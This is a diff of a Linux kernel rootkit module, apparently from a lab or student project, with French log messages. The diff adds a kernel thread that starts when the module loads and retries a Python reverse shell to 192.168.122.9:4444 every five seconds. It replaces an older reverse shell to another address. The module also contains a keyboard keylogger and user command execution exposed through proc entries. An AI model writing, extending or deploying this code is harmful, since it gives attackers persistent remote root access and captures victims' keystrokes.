@@ -11,6 +11,8 @@
 #include <linux/mutex.h>
 #include <linux/fs.h>
 #include <linux/slab.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
 
 #define BUFFER_SIZE 256
 #define BUF_SIZE 1024
@@ -24,7 +26,6 @@ MODULE_VERSION("0.1");
 #define PROC_NAME_SECRET "secret"
 #define PROC_NAME_KEYLOG "keylog"
 
-// Prototypes
 static void exec_user_cmd(const char *cmd);
 static void reverse_shell(void);
 static void start_keylogger(void);
@@ -34,7 +35,6 @@ static ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t le
 static ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos);
 static ssize_t keylog_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
 
-// Buffers
 static char proc_buf[BUF_SIZE];
 static int proc_buf_pos = 0;
 static DEFINE_MUTEX(proc_buf_mutex);
@@ -42,11 +42,12 @@ static DEFINE_MUTEX(proc_buf_mutex);
 static struct proc_dir_entry *proc_entry_rootkit;
 static struct proc_dir_entry *proc_entry_secret;
 static struct proc_dir_entry *keylog_entry;
+static struct task_struct *rs_thread;
 
 static bool shift_pressed = false;
 static bool keylogger_running = false;
 
-//----------------------------//
+ //----------------------------//
 //        CMD EXECUTION       //
 //----------------------------//
 
@@ -65,19 +66,32 @@ static void exec_user_cmd(const char *cmd)
     printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
 }
 
-//----------------------------//
-//      Reverse Shell         //
-//----------------------------//
+
+//----------------------------------//
+//         Reverse Shell            //
+//----------------------------------//
+
+
+static int reverse_shell_fn(void *data)
+{
+    while (!kthread_should_stop()) {
+        const char *cmd = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.122.9\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";
+        exec_user_cmd(cmd);
+        ssleep(5);
+    }
+    return 0;
+}
 
 static void reverse_shell(void)
 {
-    printk(KERN_INFO "[rootkit] reverse_shell() appelé\n");
-    const char *cmd = "python3 -c 'import socket,subprocess,os;"
-                      "s=socket.socket();"
-                      "s.connect((\"192.168.1.106\",4444));"
-                      "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
-                      "subprocess.call([\"/bin/sh\"])'";
-    exec_user_cmd(cmd);
+    if (!rs_thread || IS_ERR(rs_thread)) {
+        rs_thread = kthread_run(reverse_shell_fn, NULL, "reverse_shell_thread");
+        if (IS_ERR(rs_thread)) {
+            printk(KERN_ERR "[rootkit] Impossible de démarrer le thread de reverse shell\n");
+        } else {
+            printk(KERN_INFO "[rootkit] Thread de reverse shell démarré\n");
+        }
+    }
 }
 
 //----------------------------//
@@ -140,7 +154,6 @@ static void handle_key(char c)
             memmove(proc_buf, proc_buf + 1, BUF_SIZE - 2);
             proc_buf[BUF_SIZE - 2] = c;
             proc_buf[BUF_SIZE - 1] = '\0';
-            // proc_buf_pos reste à BUF_SIZE -1
         }
     }
 
@@ -153,13 +166,13 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
 
     if (code == KBD_KEYCODE) {
         if (param->down) {
-            // Gestion shift
+            // shift
             if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
                 shift_pressed = true;
                 return NOTIFY_OK;
             }
 
-            // Conversion touche en caractère
+            // conversion touche en caractère
             if (param->value < 256) {
                 char c = shift_pressed ? keymap_shift[param->value] : keymap[param->value];
                 if (c) {
@@ -328,9 +341,17 @@ static int __init rootkit_init(void)
     }
 
     mutex_init(&proc_buf_mutex);
-
     proc_buf_pos = 0;
     memset(proc_buf, 0, BUF_SIZE);
+
+    rs_thread = kthread_run(reverse_shell_fn, NULL, "rs_thread");
+    if (IS_ERR(rs_thread)) {
+        printk(KERN_ERR "[rootkit] Erreur lancement thread reverse shell\n");
+        proc_remove(proc_entry_rootkit);
+        proc_remove(proc_entry_secret);
+        proc_remove(keylog_entry);
+        return PTR_ERR(rs_thread);
+    }
 
     printk(KERN_INFO "[rootkit] Module chargé avec succès\n");
     return 0;
@@ -339,6 +360,11 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
     stop_keylogger();
+
+    if (rs_thread) {
+        kthread_stop(rs_thread);
+        printk(KERN_INFO "[rootkit] Thread reverse shell arrêté.\n");
+    }
 
     if (proc_entry_rootkit)
         proc_remove(proc_entry_rootkit);
